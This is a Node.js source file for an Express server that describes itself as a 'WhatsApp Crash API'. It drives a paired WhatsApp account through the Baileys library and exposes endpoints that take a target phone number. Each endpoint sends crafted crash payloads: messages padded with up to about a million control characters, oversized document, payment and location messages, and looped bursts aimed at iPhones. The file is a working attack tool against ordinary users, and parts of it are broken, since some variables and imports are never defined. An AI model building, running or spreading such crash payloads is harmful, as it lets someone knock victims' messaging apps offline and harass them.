const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent,
    proto,
    WAMessageStatus,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const rateLimit = require('express-rate-limit');


const bot = new Telegraf(BOT_TOKEN);
let kuzuroken = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let userSessions = {};
const usePairingCode = true;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'おさらぎです',
        }),
    };

    kuzuroken = makeWASocket(connectionOptions);
    if (usePairingCode && !kuzuroken.authState.creds.registered) {
        let phoneNumber = await question(chalk.black(chalk.bgCyan(`\nMasukkan nomor diawali dengan 62:\n`)));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await kuzuroken.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    kuzuroken.ev.on('creds.update', saveCreds);
    store.bind(kuzuroken.ev);

    kuzuroken.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp berhasil terhubung!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};
const { crashurl: xeonios } = require("./69/xeontext17");
const { getBuffer } = require('./69/myfunc');
const Qrad = {
    key: {
        remoteJid: 'p',
        from: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}
const XeonRep = {
    key: {
        remoteJid: 'p',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄��림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}
const XeonRep2 = {
    key: {
        remoteJid: 'p',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}
const XeonRep3 = {
    key: {
        remoteJid: 'p',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}


app.use(express.json());

app.get('/', (req, res) => {
    res.json({
        status: true,
        creator: 'Bakuzaan',
        message: 'WhatsApp Crash API is running',
        endpoints: [
            {
                path: '/api/xeonuinew',
                method: 'GET',
                params: {
                    number: 'string (format: 62xxx)',
                    apikey: 'string'
                }
            },
        ],
        example: '/api/xeonuinew?number=628123456789&apikey=bakuzaan'
    });
});

const validateRequest = async (req, res, next) => {
    const { number, apikey } = req.query;
    
    if (!number || !apikey) {
        return res.status(400).json({
            status: false,
            message: 'Nomor dan ApiKey diperlukan'
        });
    }

    if (apikey !== 'bakuzaan') {
        return res.status(401).json({
            status: false,
            message: 'API key tidak valid'
        });
    }

    if (!sock) {
        sock = await connectToWhatsApp();
        await new Promise(resolve => setTimeout(resolve, 3000));
    }

    req.target = `${number}@s.whatsapp.net`;
    next();
};

app.use('/api/*', validateRequest);




app.get('/', (req, res) => {
  res.json({
      status: true,
      message: 'XeonUI API is running',
      endpoints: ['/api/xeonuinew']
  });
});
app.get('/api/xeonuinew', createLimiter(15, 5), async (req, res) => {
    try {
        const number = req.query.number;
        const apikey = req.query.apikey;
        if (!number || !apikey) {
            return res.status(400).json({
                status: false,
                message: 'Nomor dan ApiKey diperlukan'
            });
        }

        if (apikey !== 'bakuzaan') {
            return res.status(401).json({
                status: false,
                message: 'API key tidak valid'
            });
        }
        if (!sock) {
            sock = await connectToWhatsApp();
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        const target = `${number}@s.whatsapp.net`;
        
        try {
            let message1 = await sock.sendMessage(target, {
                text: "🦄드림 가이 Xeon" + "ꦾ".repeat(50000)
            });
            let message2 = await sock.sendMessage(target, {
                text: "🦄드림 가이 Xeon" + "᭫".repeat(20000)
            }, { quoted: XeonRep });

            let etc = generateWAMessageFromContent(target,
                proto.Message.fromObject({
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "",
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                        fileLength: "9999999999999",
                                        pageCount: 9007199254740991,
                                        mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                        fileName: "🦄드림 가이 Xeon",
                                        fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                        mediaKeyTimestamp: "1723855952",
                                        contactVcard: true,
                                        jpegThumbnail: req.query.thumbnail || null
                                    },
                                    hasMediaAttachment: true
                                },
                                body: {
                                    text: "🦄드림 가이 Xeon" + "ꦾ".repeat(50000)
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 🦄드림 가이 Xeon \",\"body\":\"xxx\"}",
                                    buttons: [
                                        {
                                            name: "payment_method",
                                            buttonParamsJson: ""
                                        },
                                        {
                                            name: "call_permission_request",
                                            buttonParamsJson: "{}"
                                        },
                                        {
                                            name: "payment_method",
                                            buttonParamsJson: "{}"
                                        },
                                        {
                                            name: "single_select",
                                            buttonParamsJson: "{\"title\":\"🦄드림 가이 Xeon\",\"sections\":[{\"title\":\"🦄드림 가이 Xeon\",\"rows\":[]}]}"
                                        },
                                        {
                                            name: "galaxy_message",
                                            buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🦄드림 가이 Xeon\",\"flow_id\":\"🦄드림 가이 Xeon\",\"flow_message_version\":\"9\",\"flow_token\":\"🦄드림 가이 Xeon\"}"
                                        },
                                        {
                                            name: "mpm",
                                            buttonParamsJson: "{}"
                                        }
                                    ]
                                }
                            }
                        }
                    }
                }), {
                    userJid: target,
                    quoted: XeonRep
                }
            );
            await sock.relayMessage(target, etc.message, {});
            await new Promise(resolve => setTimeout(resolve, 1000));

            console.log(`Pesan terkirim ke ${target}`);

            sendResponse(res, true, 'Pesan berhasil dikirim', {
                target: req.target,
                details: {
                    message1: message1?.key || null,
                    message2: message2?.key || null,
                    message3: 'crash message sent'
                }
            });

        } catch (sendError) {
            console.error('Error saat mengirim pesan:', sendError);

            if (sendError.message.includes('Connection Closed')) {
                sock = await connectToWhatsApp();
                return res.status(500).json({
                    status: false,
                    message: 'Koneksi terputus, silakan coba lagi',
                    error: sendError.message
                });
            }
            
            throw sendError;
        }

    } catch (error) {
        console.error('Error umum:', error);
        res.status(500).json({
            status: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});
app.get('/api/xwinkelhard', async (req, res) => {
    try {
        const number = req.query.number;
        const apikey = req.query.apikey;
        
        if (!number || !apikey) {
            return res.status(400).json({
                status: false,
                message: 'Nomor dan ApiKey diperlukan'
            });
        }
  
        if (apikey !== 'bakuzaan') {
            return res.status(401).json({
                status: false,
                message: 'API key tidak valid'
            });
        }
  
        if (!sock) {
            sock = await connectToWhatsApp();
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
  
        const target = `${number}@s.whatsapp.net`;
        
        try {
            const gg = "ꦽ".repeat(10200);
            const ggg = "ꦿꦾ".repeat(10200);
            const jidds = [target];
            const xeontex = "🦄드림 가이 Xeon" + gg;
            await sock.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        extendedTextMessage: {
                            text: " '  🦄드림 가이 Xeon '\n" + gg,
                            previewType: "🦄드림 가이 Xeon",
                            contextInfo: {
                                mentionedJid: jidds
                            }
                        }
                    }
                }
            }, {});
            await sock.relayMessage(target, {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      body: {
                        text: xeontex
                      },
                      footer: {
                        text: ""
                      },
                      header: {
                        documentMessage: {
                          url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                          mimetype: "application/pdf",
                          fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                          fileLength: null,
                          pageCount: 99999999999999,
                          contactVcard: true,
                          caption: "🦄드림 가이 Xeon",
                          mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                          fileName: "🦄드림 가이 Xeon ",
                          fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                          directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                          mediaKeyTimestamp: "1714145232",
                          thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                          thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                          thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                          thumbnailHeight: 172,
                          thumbnailWidth: 480
                        },
                        hasMediaAttachment: true
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "🦄드림 가이 Xeon",
                            sections: [{
                              title: "",
                              rows: [{
                                title: "🦄드림 가이 Xeon",
                                id: ".huii"
                              }]
                            }]
                          })
                        }]
                      },
                      contextInfo: {
                        mentionedJid: jidds,
                        mentions: jidds
                      },
                      disappearingMode: {
                        initiator: "INITIATED_BY_ME",
                        inviteLinkGroupTypeV2: "DEFAULT",
                        messageContextInfo: {
                          deviceListMetadata: {
                            senderTimestamp: "1678285396",
                            recipientKeyHash: "SV5H7wGIOXqPtg==",
                            recipientTimestamp: "1678496731",
                            deviceListMetadataVersion: 2
                          }
                        }
                      }
                    }
                  }
                }
              }, {
                participant: {
                  jid: target
                }
              });
              await sock.relayMessage(target, {
                viewOnceMessage: {
                  message: {
                    locationMessage: {
                      degreesLatitude: -21.980324912168495,
                      degreesLongitude: 24.549921490252018,
                      name: "🦄드림 가이 Xeon" + ggg,
                      address: "",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                    }
                  }
                }
              }, {
                participant: {
                  jid: target
                }
              });
              await sock.relayMessage(target, {
                botInvokeMessage: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadataVersion: 2,
                      deviceListMetadata: {}
                    },
                    interactiveMessage: {
                      nativeFlowMessage: {
                        buttons: [{
                          name: "payment_info",
                          buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Xeon;\",\"key\":\"🦄드림 가이 Xeon\",\"key_type\":\"RANDOM\"}}]}"
                        }]
                      }
                    }
                  }
                }
              }, {
                participant: {
                  jid: target
                }
              });
              await sock.relayMessage(target, {
                viewOnceMessage: {
                  message: {
                    liveLocationMessage: {
                      degreesLatitude: 11111111,
                      degreesLongitude: -111111,
                      caption: xeontex,
                      url: "https://" + ggg + ".com",
                      sequenceNumber: "1678556734042001",
                      jpegThumbnail: null,
                      expiration: 7776000,
                      ephemeralSettingTimestamp: "1677306667",
                      disappearingMode: {
                        initiator: "INITIATED_BY_ME",
                        inviteLinkGroupTypeV2: "DEFAULT",
                        messageContextInfo: {
                          deviceListMetadata: {
                            senderTimestamp: "1678285396",
                            recipientKeyHash: "SV5H7wGIOXqPtg==",
                            recipientTimestamp: "1678496731",
                            deviceListMetadataVersion: 2
                          }
                        }
                      },
                      contextInfo: {
                        mentionedJid: jidds,
                        mentions: jidds,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "0@s.whatsapp.net"
                      }
                    }
                  }
                }
              }, {
                participant: {
                  jid: target
                }
              });
  
            console.log(`XwinkelHard berhasil dikirim ke ${target}`);
  
            res.json({
                status: true,
                message: 'XwinkelHard berhasil dikirim',
                target: target
            });
  
        } catch (sendError) {
            console.error('Error saat mengirim pesan:', sendError);
            throw sendError;
        }
  
    } catch (error) {
        console.error('Error umum:', error);
        res.status(500).json({
            status: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});
app.get('/api/iosxwinkel', async (req, res) => {
    try {
        const number = req.query.number;
        const apikey = req.query.apikey;
        
        if (!number || !apikey) {
            return res.status(400).json({
                status: false,
                message: 'Nomor dan ApiKey diperlukan'
            });
        }

        if (apikey !== 'bakuzaan') {
            return res.status(401).json({
                status: false,
                message: 'API key tidak valid'
            });
        }

        if (!sock) {
            sock = await connectToWhatsApp();
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        const target = `${number}@s.whatsapp.net`;
        
        try {
            for (let i = 0; i < 10; i++) {
                await sock.relayMessage(target, {
                    paymentInviteMessage: {
                        serviceType: "UPI",
                        expiryTimestamp: Date.now() + 86400000
                    }
                }, {});

                await sock.relayMessage(target, {
                    extendedTextMessage: {
                      text: "This is a message with context info\n\n\n" + xeonios + xeonios,
                      contextInfo: {
                        stanzaId: "1234567890ABCDEF",
                        participant: target,
                        quotedMessage: {
                          conversation: "This is a quoted message"
                        },
                        remoteJid: target,
                        mentionedJid: ["919366316018@s.whatsapp.net"],
                        conversionSource: "source_example",
                        conversionData: Buffer.from("conversion_data_example"),
                        conversionDelaySeconds: 10,
                        forwardingScore: 1,
                        isForwarded: true,
                        quotedAd: {
                          advertiserName: "Example Advertiser",
                          mediaType: 1,
                          jpegThumbnail: await getBuffer("https://t2.tudocdn.net/632662?w=646&h=284"),
                          caption: "This is an ad caption"
                        },
                        placeholderKey: {
                          remoteJid: target,
                          fromMe: false,
                          id: "ABCDEF1234567890"
                        },
                        expiration: 86400,
                        ephemeralSettingTimestamp: Date.now(),
                        ephemeralSharedSecret: Buffer.from("ephemeral_shared_secret_example"),
                        externalAdReply: {
                          title: "🦄드림 가이 Xeon",
                          body: "🦄드림 가이 Xeon",
                          mediaType: 1,
                          thumbnailUrl: "https://i.ibb.co/Jj0n5zV/thumb.jpg",
                          mediaUrl: "https://i.ibb.co/Jj0n5zV/thumb.jpg",
                          thumbnail: Buffer.from("1234567890abcdef", "hex"),
                          sourceType: "source_type_example",
                          sourceId: "source_id_example",
                          sourceUrl: "https://i.ibb.co/Jj0n5zV/thumb.jpg",
                          containsAutoReply: true,
                          renderLargerThumbnail: true,
                          showAdAttribution: true,
                          ctwaClid: "ctwa_clid_example",
                          ref: "ref_example"
                        },
                        entryPointConversionSource: "entry_point_source_example",
                        entryPointConversionApp: "entry_point_app_example",
                        entryPointConversionDelaySeconds: 5,
                        disappearingMode: {
                          duration: 604800
                        },
                        actionLink: {
                          buttonText: "Click Here",
                          url: "https://example.com"
                        },
                        groupSubject: "Example Group Subject",
                        parentGroupJid: "919366316018-1234567890@g.us",
                        trustBannerType: "trust_banner_example",
                        trustBannerAction: 1,
                        isSampled: false,
                        utm: {
                          utmSource: "utm_source_example",
                          utmCampaign: "utm_campaign_example"
                        },
                        forwardedNewsletterMessageInfo: {
                          newsletterJid: "919366316018-1234567890@g.us",
                          serverMessageId: 1,
                          newsletterName: "x".repeat(99999),
                          contentType: 1,
                          accessibilityText: "Example accessibility text"
                        },
                        businessMessageForwardInfo: {
                          businessOwnerJid: "919366316018@s.whatsapp.net"
                        },
                        smbClientCampaignId: "smb_client_campaign_id_example",
                        smbServerCampaignId: "smb_server_campaign_id_example",
                        dataSharingContext: {
                          showMmDisclosure: true
                        }
                      }
                    }
                  }, {});
            }

            console.log(`IOSXWINKEL berhasil dikirim ke ${target}`);

            res.json({
                status: true,
                message: 'IOSXWINKEL berhasil dikirim',
                target: target
            });

        } catch (sendError) {
            console.error('Error saat mengirim pesan:', sendError);
            throw sendError;
        }

    } catch (error) {
        console.error('Error umum:', error);
        res.status(500).json({
            status: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

const createLimiter = (minutes, max) => rateLimit({
    windowMs: minutes * 60 * 1000,
    max: max
});



app.listen(port, '0.0.0.0', () => {
    console.log(`Server berjalan di port ${port}`);
    startSesi(); 
});

